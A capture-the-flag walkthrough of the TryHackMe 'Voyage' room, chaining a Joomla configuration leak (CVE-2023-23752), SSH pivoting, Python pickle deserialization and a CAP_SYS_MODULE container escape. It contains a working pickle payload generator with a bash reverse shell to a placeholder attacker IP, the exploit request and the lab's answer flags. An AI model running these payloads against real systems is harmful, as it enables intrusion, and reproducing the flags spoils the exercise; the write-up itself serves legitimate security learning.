# 🚢 Voyage

**Room:** Voyage  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Date:** 24/09/2026
**Main techniques:** Enumeration, Joomla exploitation, information disclosure, SSH pivoting, Docker/container enumeration, SSH port forwarding, insecure Python pickle deserialization, reverse shells, Linux capabilities, kernel-module-based container escape.

> **Lab note:** The commands and techniques below are intended for the TryHackMe Voyage machine. Replace `TARGET_IP` with the IP assigned to your own instance and replace `YOUR_IP` with the IP of your AttackBox/VPN machine.

---

# 1. Reconnaissance

I began with a full TCP SYN scan to identify every exposed service:

```bash
nmap -sS -p- --min-rate 5000 TARGET_IP
```

The scan revealed three interesting ports:

```text
22/tcp
80/tcp
2222/tcp
```

I then performed service/version detection and the default NSE scripts:

```bash
nmap -sC -sV -p22,80,2222 TARGET_IP
```

The important results were:

|Port|Service|Information|
|---|---|---|
|22|SSH|OpenSSH 9.6p1|
|80|HTTP|Apache 2.4.58|
|2222|SSH|OpenSSH 8.2p1|

The existence of **two SSH services** immediately stood out. Port 2222 would become particularly important later.

---

# 2. Web Enumeration

Opening:

```text
http://TARGET_IP/
```

revealed the web application.

I also checked:

```bash
curl http://TARGET_IP/robots.txt
```

The `robots.txt` file revealed paths worth investigating.

Another useful enumeration technique was Nmap's HTTP enumeration script:

```bash
nmap --script http-enum -p80 TARGET_IP
```

This helped identify the web application as **Joomla**.

Further enumeration revealed that the Joomla version was:

```text
Joomla 4.2.7
```

The administrator interface was also accessible:

```text
http://TARGET_IP/administrator/
```

At this point, the important question became:

> Is Joomla 4.2.7 vulnerable?

---

# 3. Identifying CVE-2023-23752

Researching Joomla 4.2.7 revealed **CVE-2023-23752**.

Joomla's own security advisory confirms that versions **4.0.0 through 4.2.7** were affected by an improper access check that allowed unauthorized access to web-service endpoints. Joomla fixed the issue in **4.2.8**.

The vulnerability is particularly useful because the affected API endpoint can expose Joomla configuration information.

A vulnerable endpoint is:

```text
/api/index.php/v1/config/application?public=true
```

So I tested:

```bash
curl http://TARGET_IP/api/index.php/v1/config/application?public=true
```

The response exposed Joomla configuration information, including database-related credentials.

This is an important lesson:

> **Information disclosure does not always immediately give you a shell. It can instead provide credentials that become useful somewhere else.**

---

# 4. Recovering the SSH Credentials

The credentials obtained from the Joomla configuration could not simply be assumed to be valid for the web administrator panel.

Instead, I tested them against the exposed SSH services.

First:

```bash
ssh root@TARGET_IP
```

Port 22 rejected password authentication.

The second SSH service was different:

```bash
ssh root@TARGET_IP -p 2222
```

This succeeded.

I now had a shell as:

```text
root
```

But there was an important catch.

---

# 5. Realizing We Are Inside a Docker Container

Running:

```bash
hostname
```

gave a container-like hostname.

I then inspected the root filesystem:

```bash
ls -la /
```

One particularly important entry was:

```text
/.dockerenv
```

The presence of `.dockerenv` is a strong indication that the shell is running inside a Docker container.

I also checked the network configuration:

```bash
ip a
```

The container had an address in the:

```text
192.168.100.0/24
```

Docker network.

This changed the objective.

We were not yet at the host.

Instead:

```text
Internet
   ↓
Joomla
   ↓
Docker container #1
   ↓
??? internal services
   ↓
Docker container #2
   ↓
Host
```

So I started looking for other hosts on the internal network.

---

# 6. Internal Network Enumeration

Nmap was available inside the compromised container, so I could scan the Docker subnet from inside it:

```bash
nmap -sn 192.168.100.0/24
```

Then I investigated interesting hosts/services.

A particularly interesting discovery was:

```text
192.168.100.12:5000
```

I tested it:

```bash
curl http://192.168.100.12:5000
```

Unlike some of the other addresses, this returned a valid HTTP response.

The response identified the application as a Python web application using:

```text
Werkzeug
```

Further inspection revealed a **secret finance panel**.

This was our second web application — but it wasn't directly reachable from our attacking machine.

---

# 7. SSH Local Port Forwarding

Because the first container had network access to `192.168.100.12`, I used the existing SSH access as a tunnel.

From my attacking machine:

```bash
ssh -L 5000:192.168.100.12:5000 root@TARGET_IP -p 2222
```

The syntax is:

```text
-L LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT
```

So:

```text
127.0.0.1:5000
       ↓
SSH tunnel
       ↓
192.168.100.12:5000
```

I could now access the internal application from my own machine:

```text
http://127.0.0.1:5000/
```

Other writeups independently confirm this same pivot and identify the service as a Flask/Werkzeug application.

---

# 8. The Secret Finance Panel

The application presented a login form.

Interestingly, authentication was extremely weak: arbitrary credentials were accepted.

After logging in, the application displayed financial/investment information.

At first glance, there wasn't much to exploit.

So I inspected the HTTP traffic in Burp Suite.

The response contained an unusual cookie:

```text
session_data=...
```

The value looked like hexadecimal data.

More importantly, it began with:

```text
8004
```

That immediately suggested **Python pickle protocol 4**.

---

# 9. Identifying Python Pickle

Python's `pickle` module serializes Python objects.

The dangerous part is that **unpickling untrusted data can execute attacker-controlled code**.

I copied the cookie value and decoded it.

For example:

```python
import pickle
import binascii

cookie = "COOKIE_VALUE"

data = binascii.unhexlify(cookie)

print(pickle.loads(data))
```

The decoded object looked approximately like:

```python
{
    'user': 'testlogin',
    'revenue': '88888'
}
```

Independent writeups confirm that the `session_data` cookie contains a hex-encoded pickle object representing fields such as `user` and `revenue`.

This was the critical vulnerability:

```text
User-controlled cookie
       ↓
Hex decoding
       ↓
pickle.loads()
       ↓
Attacker-controlled Python object
       ↓
Code execution
```

---

# 10. Why Pickle Deserialization Is Dangerous

Normally, serialization is useful because an application can turn an object into data and later reconstruct it.

The problem is that Python pickle isn't designed to be a safe format for hostile input.

An attacker can create a specially crafted object whose reconstruction causes a function to execute.

The important mechanism is:

```python
__reduce__()
```

For the lab, this gives us a path from:

```text
Cookie manipulation
        ↓
Python object deserialization
        ↓
Command execution
        ↓
Shell
```

---

# 11. Turning Pickle Deserialization into RCE

For the TryHackMe lab, I generated a malicious pickle object.

A simplified payload generator looks like:

```python
import pickle
import os
import binascii

class Exploit:
    def __reduce__(self):
        return (
            os.system,
            (
                'bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"',
            )
        )

payload = pickle.dumps(Exploit())

print(binascii.hexlify(payload).decode())
```

The result is a hexadecimal string.

That string becomes the value of:

```text
session_data
```

---

# 12. Catching the Reverse Shell

I started a listener on my attacking machine:

```bash
nc -lvnp YOUR_PORT
```

Then I sent a request to the finance panel using the malicious cookie.

For example:

```bash
curl http://127.0.0.1:5000/ \
-H "Cookie: session_data=YOUR_MALICIOUS_HEX"
```

The application deserialized the object.

The payload executed.

The listener received a shell.

I had now reached the **second Docker container**.

---

# 13. Confirming the Second Container

I checked my privileges:

```bash
id
```

The shell was running as:

```text
uid=0(root)
```

However, once again, root did **not** necessarily mean host root.

I checked:

```bash
ls -la /
```

and confirmed that I was in another container.

The container hostname was different from the first one.

The architecture of the challenge was now:

```text
                HOST
                  │
          ┌───────┴───────┐
          │ Docker network│
          │               │
       Container 1     Container 2
          │               │
       Joomla          Flask
          │               │
        SSH             Pickle
```

The first flag was now available in the second container.

---

# 14. Getting the User Flag

I checked:

```bash
ls -la /root
```

and then:

```bash
cat /root/user.txt
```

The user-level flag is:

```text
THM{ee346612fb944085af0dd2cd677b1902}
```

This flag is independently confirmed by another Voyage writeup.

---

# 15. Container Escape Enumeration

Getting root inside a Docker container isn't the same thing as escaping the container.

So I began enumerating the container's security configuration.

Useful commands include:

```bash
id
```

```bash
capsh --print
```

```bash
cat /proc/self/status
```

and:

```bash
mount
```

I also used container-focused enumeration to identify dangerous Docker configuration.

Two findings were especially important:

### 1. `/proc` exposure

The container had access to the host's `/proc` filesystem.

`/proc` exposes kernel and process information and is therefore particularly interesting during container-escape enumeration.

### 2. `CAP_SYS_MODULE`

The container possessed:

```text
CAP_SYS_MODULE
```

This was the critical discovery.

---

# 16. Understanding CAP_SYS_MODULE

Linux capabilities divide some of root's traditional powers into smaller privileges.

`CAP_SYS_MODULE` allows a process to load and unload kernel modules.

Normally, a Docker container should not be able to load arbitrary modules into the host kernel.

But this container had been granted that capability.

That creates a dangerous boundary violation:

```text
Container
   │
   │ CAP_SYS_MODULE
   ↓
Host kernel
   │
   ↓
Host
```

The key insight is that Docker containers share the host's kernel.

A kernel module therefore executes in the context of the **host kernel**, rather than merely becoming another ordinary process inside the container.

Other Voyage writeups independently identify `CAP_SYS_MODULE` as the critical escape vector.

---

# 17. Checking the Kernel Version

Before compiling a kernel module, I checked the running kernel:

```bash
uname -r
```

The challenge environment reported a kernel in the:

```text
6.8.0-1031-aws
```

family.

I then checked which kernel headers were installed:

```bash
ls /lib/modules/
```

The available headers included:

```text
6.8.0-1029-aws
6.8.0-1030-aws
```

The important detail was that the exact running kernel and installed headers didn't perfectly match.

The challenge's environment nevertheless provided usable headers for:

```text
6.8.0-1030-aws
```

This detail is confirmed in the original writeup and another independent walkthrough.

---

# 18. Kernel Module

The exploit used a Linux kernel module that executes a command when the module is loaded.

Conceptually:

```text
insmod malicious.ko
        ↓
kernel loads module
        ↓
module initialization function executes
        ↓
command launched
        ↓
connection back to attacker
```

The module uses the kernel's:

```text
call_usermodehelper()
```

mechanism to launch a userspace command.

A lab-specific module can therefore be constructed to create a callback shell to the attack machine.

The important point isn't simply "compile a reverse shell."

The important security concept is:

> **A container that can load arbitrary kernel modules has crossed a fundamental isolation boundary because the kernel belongs to the host.**

---

# 19. Makefile

The kernel module needs to be compiled against the available kernel headers.

A typical module Makefile uses the kernel build system:

```make
obj-m += rev.o

KDIR := /lib/modules/6.8.0-1030-aws/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
```

**Important:** the indentation before `$(MAKE)` must be a real **TAB**, not spaces.

Otherwise `make` will report an error.

---

# 20. Compiling the Module

Once the source and Makefile were prepared:

```bash
make
```

The build produced:

```text
rev.ko
```

The `.ko` extension means:

```text
Kernel Object
```

So we now had a compiled Linux kernel module.

---

# 21. Loading the Module

With the callback listener ready on the attacking machine, I loaded the module:

```bash
insmod rev.ko
```

Because the container possessed `CAP_SYS_MODULE`, the operation succeeded.

The module's initialization code executed.

The resulting shell came from the **host**, not merely the container.

This is the crucial moment of the challenge:

```text
Joomla
  ↓
Container #1
  ↓
Internal Flask application
  ↓
Container #2
  ↓
CAP_SYS_MODULE
  ↓
HOST KERNEL
  ↓
HOST ROOT
```

---

# 22. Confirming the Escape

Once the callback arrived, I checked:

```bash
id
```

and:

```bash
hostname
```

The environment was now the main host rather than the previous Docker container.

I could therefore inspect the host filesystem.

---

# 23. Root Flag

Finally:

```bash
cd /root
```

and:

```bash
cat root.txt
```

The root-level flag is:

```text
THM{ace91ec899f84498a74629b078bdceff}
```

This exact flag is independently confirmed by multiple Voyage writeups.

---

# 24. Complete Attack Chain

The entire machine can be reduced to one chain:

```text
                  ┌─────────────────────┐
                  │     TARGET HOST     │
                  └──────────┬──────────┘
                             │
                         Port 80
                             │
                             ▼
                  ┌─────────────────────┐
                  │   Joomla 4.2.7     │
                  └──────────┬──────────┘
                             │
                    CVE-2023-23752
                             │
                             ▼
                  Joomla configuration
                    credential leak
                             │
                             ▼
                     SSH :2222
                             │
                             ▼
                  ┌─────────────────────┐
                  │    CONTAINER #1     │
                  │       root          │
                  └──────────┬──────────┘
                             │
                     192.168.100.0/24
                             │
                             ▼
                  192.168.100.12:5000
                             │
                      SSH port forward
                             │
                             ▼
                  ┌─────────────────────┐
                  │   Flask Finance     │
                  │       Panel         │
                  └──────────┬──────────┘
                             │
                     session_data
                             │
                     Python pickle
                             │
                             ▼
                    Insecure deserialization
                             │
                             ▼
                  ┌─────────────────────┐
                  │    CONTAINER #2     │
                  │       root          │
                  └──────────┬──────────┘
                             │
                       Enumeration
                             │
                  CAP_SYS_MODULE + /proc
                             │
                             ▼
                    Malicious kernel
                        module
                             │
                         insmod
                             │
                             ▼
                  ┌─────────────────────┐
                  │      HOST OS        │
                  │       root          │
                  └──────────┬──────────┘
                             │
                             ▼
                         root.txt
```

---

# 25. What Made Voyage Interesting?

Voyage wasn't really one vulnerability.

It was a **chain of vulnerabilities and trust mistakes**.

### Vulnerability 1 — Joomla information disclosure

```text
Joomla 4.2.7
       ↓
CVE-2023-23752
       ↓
configuration disclosure
       ↓
credentials
```

Joomla officially identifies 4.0.0–4.2.7 as affected and 4.2.8 as the fixed release.

### Vulnerability 2 — Exposed SSH service

The recovered credentials were useful against the separate SSH service on port 2222.

### Vulnerability 3 — Internal network exposure

The first container could communicate with another Docker network host:

```text
192.168.100.12
```

### Vulnerability 4 — Unsafe deserialization

The Flask application trusted client-controlled:

```text
session_data
```

and deserialized it with Python pickle.

### Vulnerability 5 — Dangerous container capability

The second container possessed:

```text
CAP_SYS_MODULE
```

which provided the final path across the container/host boundary.

---

# 26. The Most Important Lessons

## Lesson 1 — Don't stop at the first shell

Getting:

```text
root@container
```

doesn't necessarily mean:

```text
root@host
```

Always determine **where** your shell actually exists.

Useful checks:

```bash
hostname
```

```bash
cat /proc/1/cgroup
```

```bash
ls -la /
```

```bash
mount
```

---

## Lesson 2 — Credentials can have unexpected uses

The Joomla credentials weren't necessarily intended for Joomla's administrator login.

They became useful against:

```text
SSH :2222
```

Always test the context in which credentials might be valid — within the authorized lab environment.

---

## Lesson 3 — Enumerate internal networks

After gaining access to a container, don't assume the machine is isolated.

Check:

```bash
ip a
```

and investigate accessible internal hosts.

In Voyage, that led to:

```text
192.168.100.12:5000
```

---

## Lesson 4 — Understand serialization formats

Seeing:

```text
8004
```

inside a Python web application's cookie should make you think about pickle protocol 4.

But the deeper lesson is:

> **Never deserialize attacker-controlled pickle data.**

For applications that need client-side state, safer formats and integrity/authentication mechanisms should be used.

---

## Lesson 5 — Container root isn't host root

This is probably the biggest lesson from Voyage.

Docker isolation is based on several kernel mechanisms and security controls.

Giving a container powerful capabilities can undermine that isolation.

In this case:

```text
CAP_SYS_MODULE
```

was enough to make the kernel itself part of the attack surface.

---

# 27. Final Flags

### User-level flag

```text
THM{ee346612fb944085af0dd2cd677b1902}
```

### Root-level flag

```text
THM{ace91ec899f84498a74629b078bdceff}
```

---
